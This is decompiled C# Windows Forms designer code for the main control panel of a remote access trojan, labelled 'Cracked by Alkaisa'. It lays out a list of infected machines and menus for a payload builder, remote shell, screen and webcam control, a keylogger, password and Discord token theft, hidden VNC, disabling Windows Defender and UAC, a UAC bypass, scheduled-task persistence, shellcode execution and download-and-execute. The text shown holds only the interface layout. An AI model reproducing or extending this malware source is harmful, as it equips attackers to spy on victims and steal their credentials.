namespace Server
{
	// Token: 0x02000025 RID: 37
	public partial class FormMain : global::System.Windows.Forms.Form
	{
		// Token: 0x060001A3 RID: 419 RVA: 0x00002BD5 File Offset: 0x00000DD5
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060001A4 RID: 420 RVA: 0x00015F2C File Offset: 0x0001412C
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.FormMain));
			this.ConnectTimeout = new global::System.Windows.Forms.Timer(this.components);
			this.listView3 = new global::System.Windows.Forms.ListView();
			this.ThumbnailImageList = new global::System.Windows.Forms.ImageList(this.components);
			this.listView4 = new global::System.Windows.Forms.ListView();
			this.columnHeader4 = new global::System.Windows.Forms.ColumnHeader();
			this.columnHeader5 = new global::System.Windows.Forms.ColumnHeader();
			this.columnHeader3 = new global::System.Windows.Forms.ColumnHeader();
			this.listView2 = new global::System.Windows.Forms.ListView();
			this.columnHeader1 = new global::System.Windows.Forms.ColumnHeader();
			this.columnHeader2 = new global::System.Windows.Forms.ColumnHeader();
			this.columnHeader6 = new global::System.Windows.Forms.ColumnHeader();
			this.TimerTask = new global::System.Windows.Forms.Timer(this.components);
			this.notifyIcon1 = new global::System.Windows.Forms.NotifyIcon(this.components);
			this.performanceCounter2 = new global::System.Diagnostics.PerformanceCounter();
			this.performanceCounter1 = new global::System.Diagnostics.PerformanceCounter();
			this.UpdateUI = new global::System.Windows.Forms.Timer(this.components);
			this.ping = new global::System.Windows.Forms.Timer(this.components);
			this.siticoneTabControl1 = new global::Siticone.Desktop.UI.WinForms.SiticoneTabControl();
			this.tabPage5 = new global::System.Windows.Forms.TabPage();
			this.pictureBox2 = new global::System.Windows.Forms.PictureBox();
			this.panel2 = new global::System.Windows.Forms.Panel();
			this.siticoneGradientPanel7 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.siticoneGradientPanel6 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.tabPage1 = new global::System.Windows.Forms.TabPage();
			this.listView1 = new global::System.Windows.Forms.ListView();
			this.lv_ip = new global::System.Windows.Forms.ColumnHeader();
			this.lv_country = new global::System.Windows.Forms.ColumnHeader();
			this.lv_group = new global::System.Windows.Forms.ColumnHeader();
			this.lv_hwid = new global::System.Windows.Forms.ColumnHeader();
			this.lv_user = new global::System.Windows.Forms.ColumnHeader();
			this.lv_camera = new global::System.Windows.Forms.ColumnHeader();
			this.lv_os = new global::System.Windows.Forms.ColumnHeader();
			this.lv_version = new global::System.Windows.Forms.ColumnHeader();
			this.lv_ins = new global::System.Windows.Forms.ColumnHeader();
			this.lv_admin = new global::System.Windows.Forms.ColumnHeader();
			this.lv_av = new global::System.Windows.Forms.ColumnHeader();
			this.lv_ping = new global::System.Windows.Forms.ColumnHeader();
			this.lv_act = new global::System.Windows.Forms.ColumnHeader();
			this.contextMenuClient = new global::Siticone.Desktop.UI.WinForms.SiticoneContextMenuStrip();
			this.builderToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.controlManagementToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.controlManagementToolStripMenuItem19 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UninstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.StopToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RestartToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UpdateToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.controlManagementToolStripMenuItem20 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.LogoutToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RebootToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ShutDownToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.controlManagementToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RemoteShellToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RemoteScreenToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RemoteCameraToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FileManagerToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.remoteRegeditToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ProcessManagerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.netstatToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RecordToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.controlManagementToolStripMenuItem3 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.VisteWebsiteToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.runShellcodeToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ChangeWallpaperToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FileSearchToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.controlManagementToolStripMenuItem4 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableWDToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableUACToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.controlManagementToolStripMenuItem5 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SilentCleanupToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RunasToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.controlManagementToolStripMenuItem6 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SchtaskInstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SchtaskUninstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.controlManagementToolStripMenuItem7 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.passwordRecoveryToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripMenuItem3 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.autoKeyloggerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.controlManagementToolStripMenuItem8 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DiscordRecoveryToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.controlManagementToolStripMenuItem9 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.BtnHVNCPanel = new global::System.Windows.Forms.ToolStripMenuItem();
			this.moveToHVNCToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.executeToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SendFileToMemoryToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SendFileToDiskToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.fromUrlToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.justForFunToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.BtnClientFolders = new global::System.Windows.Forms.ToolStripMenuItem();
			this.InformationToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.selectToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.tabPage2 = new global::System.Windows.Forms.TabPage();
			this.siticoneGradientPanel8 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.cLEARToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.tabPage3 = new global::System.Windows.Forms.TabPage();
			this.siticoneGradientPanel4 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.siticoneGradientButton2 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.siticoneGradientButton9 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.siticoneGradientPanel5 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.tabPage4 = new global::System.Windows.Forms.TabPage();
			this.siticoneGradientPanel3 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.uPDATEToolStripMenuItem1 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.sendFileFromUrlToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.disableWDToolStripMenuItem1 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.downloadAndExecuteToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.disableUACToolStripMenuItem1 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.sENDFILETOMEMORYToolStripMenuItem1 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.installSchtaskToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.dELETETASKToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.siticoneGradientPanel2 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.siticoneControlBox3 = new global::Siticone.Desktop.UI.WinForms.SiticoneControlBox();
			this.siticoneControlBox4 = new global::Siticone.Desktop.UI.WinForms.SiticoneControlBox();
			this.toolStripStatusLabel1 = new global::System.Windows.Forms.Label();
			this.siticoneGradientPanel1 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.BtnPMTelegram = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.Btnwebsite = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.BtnTGgroup = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.BtcnhvncClients = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.BuilderToolStripMenuItem = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.BtnClientFolder = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton();
			this.label2 = new global::System.Windows.Forms.Label();
			this.panel1 = new global::System.Windows.Forms.Panel();
			this.label3 = new global::System.Windows.Forms.Label();
			this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.siticoneDragControl1 = new global::Siticone.Desktop.UI.WinForms.SiticoneDragControl(this.components);
			this.siticoneBorderlessForm1 = new global::Siticone.Desktop.UI.WinForms.SiticoneBorderlessForm(this.components);
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter2).BeginInit();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter1).BeginInit();
			this.siticoneTabControl1.SuspendLayout();
			this.tabPage5.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox2).BeginInit();
			this.tabPage1.SuspendLayout();
			this.contextMenuClient.SuspendLayout();
			this.tabPage2.SuspendLayout();
			this.siticoneGradientPanel8.SuspendLayout();
			this.tabPage3.SuspendLayout();
			this.siticoneGradientPanel4.SuspendLayout();
			this.tabPage4.SuspendLayout();
			this.siticoneGradientPanel3.SuspendLayout();
			this.siticoneGradientPanel2.SuspendLayout();
			this.siticoneGradientPanel1.SuspendLayout();
			this.panel1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			base.SuspendLayout();
			this.ConnectTimeout.Enabled = true;
			this.ConnectTimeout.Interval = 5000;
			this.ConnectTimeout.Tick += new global::System.EventHandler(this.ConnectTimeout_Tick);
			this.listView3.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.listView3.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.listView3.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.listView3.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.listView3.HideSelection = false;
			this.listView3.LargeImageList = this.ThumbnailImageList;
			this.listView3.Location = new global::System.Drawing.Point(3, 27);
			this.listView3.Margin = new global::System.Windows.Forms.Padding(2);
			this.listView3.Name = "listView3";
			this.listView3.ShowItemToolTips = true;
			this.listView3.Size = new global::System.Drawing.Size(1546, 587);
			this.listView3.SmallImageList = this.ThumbnailImageList;
			this.listView3.TabIndex = 0;
			this.listView3.UseCompatibleStateImageBehavior = false;
			this.ThumbnailImageList.ColorDepth = global::System.Windows.Forms.ColorDepth.Depth16Bit;
			this.ThumbnailImageList.ImageSize = new global::System.Drawing.Size(256, 256);
			this.ThumbnailImageList.TransparentColor = global::System.Drawing.Color.Transparent;
			this.listView4.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.listView4.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.listView4.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.columnHeader4,
				this.columnHeader5,
				this.columnHeader3
			});
			this.listView4.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.listView4.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.listView4.FullRowSelect = true;
			this.listView4.HideSelection = false;
			this.listView4.Location = new global::System.Drawing.Point(3, 3);
			this.listView4.Margin = new global::System.Windows.Forms.Padding(2);
			this.listView4.Name = "listView4";
			this.listView4.Size = new global::System.Drawing.Size(1546, 611);
			this.listView4.TabIndex = 0;
			this.listView4.UseCompatibleStateImageBehavior = false;
			this.listView4.View = global::System.Windows.Forms.View.Details;
			this.columnHeader4.Text = "";
			this.columnHeader4.Width = 200;
			this.columnHeader5.Text = "";
			this.columnHeader5.Width = 200;
			this.columnHeader3.Text = "";
			this.columnHeader3.Width = 1147;
			this.listView2.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.listView2.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.listView2.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.columnHeader1,
				this.columnHeader2,
				this.columnHeader6
			});
			this.listView2.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.listView2.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.listView2.FullRowSelect = true;
			this.listView2.HideSelection = false;
			this.listView2.Location = new global::System.Drawing.Point(3, 3);
			this.listView2.Margin = new global::System.Windows.Forms.Padding(2);
			this.listView2.Name = "listView2";
			this.listView2.ShowGroups = false;
			this.listView2.ShowItemToolTips = true;
			this.listView2.Size = new global::System.Drawing.Size(1546, 611);
			this.listView2.TabIndex = 2;
			this.listView2.UseCompatibleStateImageBehavior = false;
			this.listView2.View = global::System.Windows.Forms.View.Details;
			this.columnHeader1.Text = "Real Time";
			this.columnHeader1.Width = 150;
			this.columnHeader2.Text = "Plugins Logs";
			this.columnHeader2.Width = 705;
			this.columnHeader6.Text = "";
			this.columnHeader6.Width = 691;
			this.TimerTask.Enabled = true;
			this.TimerTask.Interval = 5000;
			this.TimerTask.Tick += new global::System.EventHandler(this.TimerTask_Tick);
			this.notifyIcon1.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("notifyIcon1.Icon");
			this.notifyIcon1.Text = "Cracked by Alkaisa";
			this.notifyIcon1.Visible = true;
			this.performanceCounter2.CategoryName = "Memory";
			this.performanceCounter2.CounterName = "% Committed Bytes In Use";
			this.performanceCounter1.CategoryName = "Processor";
			this.performanceCounter1.CounterName = "% Processor Time";
			this.performanceCounter1.InstanceName = "_Total";
			this.UpdateUI.Enabled = true;
			this.UpdateUI.Interval = 500;
			this.UpdateUI.Tick += new global::System.EventHandler(this.UpdateUI_Tick);
			this.ping.Enabled = true;
			this.ping.Interval = 30000;
			this.ping.Tick += new global::System.EventHandler(this.ping_Tick);
			this.siticoneTabControl1.Controls.Add(this.tabPage5);
			this.siticoneTabControl1.Controls.Add(this.tabPage1);
			this.siticoneTabControl1.Controls.Add(this.tabPage2);
			this.siticoneTabControl1.Controls.Add(this.tabPage3);
			this.siticoneTabControl1.Controls.Add(this.tabPage4);
			this.siticoneTabControl1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.siticoneTabControl1.ItemSize = new global::System.Drawing.Size(311, 40);
			this.siticoneTabControl1.Location = new global::System.Drawing.Point(0, 69);
			this.siticoneTabControl1.MaximumSize = new global::System.Drawing.Size(1560, 689);
			this.siticoneTabControl1.MinimumSize = new global::System.Drawing.Size(1560, 689);
			this.siticoneTabControl1.Name = "siticoneTabControl1";
			this.siticoneTabControl1.SelectedIndex = 0;
			this.siticoneTabControl1.Size = new global::System.Drawing.Size(1560, 689);
			this.siticoneTabControl1.TabButtonHoverState.BorderColor = global::System.Drawing.Color.Empty;
			this.siticoneTabControl1.TabButtonHoverState.FillColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneTabControl1.TabButtonHoverState.Font = new global::System.Drawing.Font("Segoe UI Semibold", 10f);
			this.siticoneTabControl1.TabButtonHoverState.ForeColor = global::System.Drawing.Color.White;
			this.siticoneTabControl1.TabButtonHoverState.InnerColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneTabControl1.TabButtonIdleState.BorderColor = global::System.Drawing.Color.Empty;
			this.siticoneTabControl1.TabButtonIdleState.FillColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneTabControl1.TabButtonIdleState.Font = new global::System.Drawing.Font("Segoe UI Semibold", 10f);
			this.siticoneTabControl1.TabButtonIdleState.ForeColor = global::System.Drawing.Color.FromArgb(156, 160, 167);
			this.siticoneTabControl1.TabButtonIdleState.InnerColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneTabControl1.TabButtonSelectedState.BorderColor = global::System.Drawing.Color.Empty;
			this.siticoneTabControl1.TabButtonSelectedState.FillColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneTabControl1.TabButtonSelectedState.Font = new global::System.Drawing.Font("Segoe UI Semibold", 10f);
			this.siticoneTabControl1.TabButtonSelectedState.ForeColor = global::System.Drawing.Color.White;
			this.siticoneTabControl1.TabButtonSelectedState.InnerColor = global::System.Drawing.Color.FromArgb(27, 91, 50);
			this.siticoneTabControl1.TabButtonSize = new global::System.Drawing.Size(311, 40);
			this.siticoneTabControl1.TabIndex = 17;
			this.siticoneTabControl1.TabMenuBackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneTabControl1.TabMenuOrientation = 0;
			this.tabPage5.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.tabPage5.Controls.Add(this.pictureBox2);
			this.tabPage5.Controls.Add(this.panel2);
			this.tabPage5.Controls.Add(this.siticoneGradientPanel7);
			this.tabPage5.Controls.Add(this.siticoneGradientPanel6);
			this.tabPage5.ImageIndex = 8;
			this.tabPage5.Location = new global::System.Drawing.Point(4, 44);
			this.tabPage5.Name = "tabPage5";
			this.tabPage5.Padding = new global::System.Windows.Forms.Padding(3);
			this.tabPage5.Size = new global::System.Drawing.Size(1552, 641);
			this.tabPage5.TabIndex = 4;
			this.tabPage5.Text = "Welcome";
			this.pictureBox2.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.pictureBox2.ErrorImage = null;
			this.pictureBox2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("pictureBox2.Image");
			this.pictureBox2.InitialImage = null;
			this.pictureBox2.Location = new global::System.Drawing.Point(480, 243);
			this.pictureBox2.Name = "pictureBox2";
			this.pictureBox2.Size = new global::System.Drawing.Size(586, 115);
			this.pictureBox2.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.pictureBox2.TabIndex = 150;
			this.pictureBox2.TabStop = false;
			this.panel2.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.panel2.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.panel2.Location = new global::System.Drawing.Point(3, 27);
			this.panel2.Name = "panel2";
			this.panel2.Size = new global::System.Drawing.Size(1546, 587);
			this.panel2.TabIndex = 153;
			this.siticoneGradientPanel7.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel7.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.siticoneGradientPanel7.FillColor = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel7.FillColor2 = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel7.Location = new global::System.Drawing.Point(3, 3);
			this.siticoneGradientPanel7.Name = "siticoneGradientPanel7";
			this.siticoneGradientPanel7.ShadowDecoration.Parent = this.siticoneGradientPanel7;
			this.siticoneGradientPanel7.Size = new global::System.Drawing.Size(1546, 24);
			this.siticoneGradientPanel7.TabIndex = 152;
			this.siticoneGradientPanel6.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel6.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.siticoneGradientPanel6.FillColor = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel6.FillColor2 = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel6.Location = new global::System.Drawing.Point(3, 614);
			this.siticoneGradientPanel6.Name = "siticoneGradientPanel6";
			this.siticoneGradientPanel6.ShadowDecoration.Parent = this.siticoneGradientPanel6;
			this.siticoneGradientPanel6.Size = new global::System.Drawing.Size(1546, 24);
			this.siticoneGradientPanel6.TabIndex = 151;
			this.tabPage1.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.tabPage1.Controls.Add(this.listView1);
			this.tabPage1.ImageIndex = 1;
			this.tabPage1.Location = new global::System.Drawing.Point(4, 44);
			this.tabPage1.Name = "tabPage1";
			this.tabPage1.Padding = new global::System.Windows.Forms.Padding(3);
			this.tabPage1.Size = new global::System.Drawing.Size(1552, 641);
			this.tabPage1.TabIndex = 0;
			this.tabPage1.Text = "Dashboard";
			this.listView1.BackColor = global::System.Drawing.Color.FromArgb(26, 26, 26);
			this.listView1.BackgroundImage = (global::System.Drawing.Image)componentResourceManager.GetObject("listView1.BackgroundImage");
			this.listView1.BackgroundImageTiled = true;
			this.listView1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.listView1.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.lv_ip,
				this.lv_country,
				this.lv_group,
				this.lv_hwid,
				this.lv_user,
				this.lv_camera,
				this.lv_os,
				this.lv_version,
				this.lv_ins,
				this.lv_admin,
				this.lv_av,
				this.lv_ping,
				this.lv_act
			});
			this.listView1.ContextMenuStrip = this.contextMenuClient;
			this.listView1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.listView1.ForeColor = global::System.Drawing.Color.Silver;
			this.listView1.FullRowSelect = true;
			this.listView1.HideSelection = false;
			this.listView1.Location = new global::System.Drawing.Point(3, 3);
			this.listView1.Margin = new global::System.Windows.Forms.Padding(2);
			this.listView1.Name = "listView1";
			this.listView1.ShowGroups = false;
			this.listView1.ShowItemToolTips = true;
			this.listView1.Size = new global::System.Drawing.Size(1546, 635);
			this.listView1.TabIndex = 1;
			this.listView1.UseCompatibleStateImageBehavior = false;
			this.listView1.View = global::System.Windows.Forms.View.Details;
			this.listView1.ColumnClick += new global::System.Windows.Forms.ColumnClickEventHandler(this.ListView1_ColumnClick);
			this.listView1.KeyDown += new global::System.Windows.Forms.KeyEventHandler(this.listView1_KeyDown);
			this.listView1.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.listView1_MouseMove);
			this.lv_ip.Text = "IP Address";
			this.lv_ip.Width = 121;
			this.lv_country.Text = "Location";
			this.lv_country.Width = 124;
			this.lv_group.Text = "Group Team";
			this.lv_group.Width = 80;
			this.lv_hwid.Text = "Hardware ID";
			this.lv_hwid.Width = 117;
			this.lv_user.Text = "PC - Username";
			this.lv_user.Width = 117;
			this.lv_camera.Text = "Web Camera";
			this.lv_camera.Width = 80;
			this.lv_os.Text = "Operating System";
			this.lv_os.Width = 179;
			this.lv_version.Text = "Client Version";
			this.lv_version.Width = 126;
			this.lv_ins.Text = "Active time";
			this.lv_ins.Width = 120;
			this.lv_admin.Text = "Privilege Level";
			this.lv_admin.Width = 166;
			this.lv_av.Text = "OS AntiVirus";
			this.lv_av.Width = 136;
			this.lv_ping.Text = "Ping";
			this.lv_act.Text = "Activity Program";
			this.lv_act.Width = 120;
			this.contextMenuClient.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.contextMenuClient.Font = new global::System.Drawing.Font("Segoe UI", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.contextMenuClient.ImageScalingSize = new global::System.Drawing.Size(27, 27);
			this.contextMenuClient.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.builderToolStripMenuItem1,
				this.controlManagementToolStripMenuItem1,
				this.controlManagementToolStripMenuItem2,
				this.controlManagementToolStripMenuItem3,
				this.controlManagementToolStripMenuItem4,
				this.controlManagementToolStripMenuItem5,
				this.controlManagementToolStripMenuItem6,
				this.controlManagementToolStripMenuItem7,
				this.controlManagementToolStripMenuItem8,
				this.controlManagementToolStripMenuItem9,
				this.executeToolStripMenuItem,
				this.justForFunToolStripMenuItem,
				this.BtnClientFolders,
				this.InformationToolStripMenuItem,
				this.selectToolStripMenuItem
			});
			this.contextMenuClient.Name = "siticoneContextMenuStrip1";
			this.contextMenuClient.RenderStyle.ArrowColor = global::System.Drawing.Color.FromArgb(18, 105, 48);
			this.contextMenuClient.RenderStyle.BorderColor = global::System.Drawing.Color.FromArgb(18, 105, 48);
			this.contextMenuClient.RenderStyle.ColorTable = null;
			this.contextMenuClient.RenderStyle.RoundedEdges = true;
			this.contextMenuClient.RenderStyle.SelectionArrowColor = global::System.Drawing.Color.White;
			this.contextMenuClient.RenderStyle.SelectionBackColor = global::System.Drawing.Color.FromArgb(18, 105, 48);
			this.contextMenuClient.RenderStyle.SelectionForeColor = global::System.Drawing.Color.White;
			this.contextMenuClient.RenderStyle.SeparatorColor = global::System.Drawing.Color.Gainsboro;
			this.contextMenuClient.RenderStyle.TextRenderingHint = global::System.Drawing.Text.TextRenderingHint.SystemDefault;
			this.contextMenuClient.Size = new global::System.Drawing.Size(247, 514);
			this.builderToolStripMenuItem1.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.builderToolStripMenuItem1.ForeColor = global::System.Drawing.Color.DarkGray;
			this.builderToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("builderToolStripMenuItem1.Image");
			this.builderToolStripMenuItem1.Name = "builderToolStripMenuItem1";
			this.builderToolStripMenuItem1.Size = new global::System.Drawing.Size(246, 34);
			this.builderToolStripMenuItem1.Text = "    Building Server";
			this.builderToolStripMenuItem1.Click += new global::System.EventHandler(this.builderToolStripMenuItem1_Click);
			this.controlManagementToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.controlManagementToolStripMenuItem19,
				this.controlManagementToolStripMenuItem20
			});
			this.controlManagementToolStripMenuItem1.ForeColor = global::System.Drawing.Color.DarkGray;
			this.controlManagementToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("controlManagementToolStripMenuItem1.Image");
			this.controlManagementToolStripMenuItem1.Name = "controlManagementToolStripMenuItem1";
			this.controlManagementToolStripMenuItem1.Size = new global::System.Drawing.Size(246, 34);
			this.controlManagementToolStripMenuItem1.Text = "    Client Control";
			this.controlManagementToolStripMenuItem19.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.controlManagementToolStripMenuItem19.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.UninstallToolStripMenuItem,
				this.StopToolStripMenuItem1,
				this.RestartToolStripMenuItem1,
				this.UpdateToolStripMenuItem
			});
			this.controlManagementToolStripMenuItem19.ForeColor = global::System.Drawing.Color.DarkGray;
			this.controlManagementToolStripMenuItem19.Name = "controlManagementToolStripMenuItem19";
			this.controlManagementToolStripMenuItem19.Size = new global::System.Drawing.Size(206, 24);
			this.controlManagementToolStripMenuItem19.Text = "Connection Control";
			this.UninstallToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.UninstallToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem";
			this.UninstallToolStripMenuItem.Size = new global::System.Drawing.Size(169, 24);
			this.UninstallToolStripMenuItem.Text = "Uninstall";
			this.UninstallToolStripMenuItem.Click += new global::System.EventHandler(this.UninstallToolStripMenuItem_Click);
			this.StopToolStripMenuItem1.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.StopToolStripMenuItem1.ForeColor = global::System.Drawing.Color.DarkGray;
			this.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1";
			this.StopToolStripMenuItem1.Size = new global::System.Drawing.Size(169, 24);
			this.StopToolStripMenuItem1.Text = "Disconnecd";
			this.StopToolStripMenuItem1.Click += new global::System.EventHandler(this.StopToolStripMenuItem1_Click);
			this.RestartToolStripMenuItem1.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.RestartToolStripMenuItem1.ForeColor = global::System.Drawing.Color.DarkGray;
			this.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1";
			this.RestartToolStripMenuItem1.Size = new global::System.Drawing.Size(169, 24);
			this.RestartToolStripMenuItem1.Text = "Reconnect";
			this.RestartToolStripMenuItem1.Click += new global::System.EventHandler(this.RestartToolStripMenuItem1_Click);
			this.UpdateToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
